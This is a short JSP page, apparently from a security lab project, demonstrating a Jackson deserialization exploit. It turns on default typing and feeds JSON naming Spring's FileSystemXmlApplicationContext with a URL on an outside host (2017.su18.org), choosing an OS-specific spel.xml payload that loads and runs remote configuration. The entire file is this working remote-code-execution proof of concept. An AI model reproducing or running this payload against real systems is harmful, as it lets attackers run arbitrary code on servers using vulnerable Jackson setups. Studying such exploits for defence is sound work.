<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="com.fasterxml.jackson.databind.ObjectMapper" %>
<%@ page import="com.anbai.sec.vuls.entity.SysArticle" %>
<%
    String payload;
    if (System.getProperty("os.name") != null && System.getProperty("os.name").startsWith("Win")) {
        payload = "spelwin.xml";
    } else {
        payload = "spel.xml";
    }
    String json = "{\"userId\":123, \"object\": [\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://2017.su18.org/" + payload + "\"]}";


    ObjectMapper mapper = new ObjectMapper();
    mapper.enableDefaultTyping();
    SysArticle article = mapper.readValue(json, SysArticle.class);

    out.println(article);
%>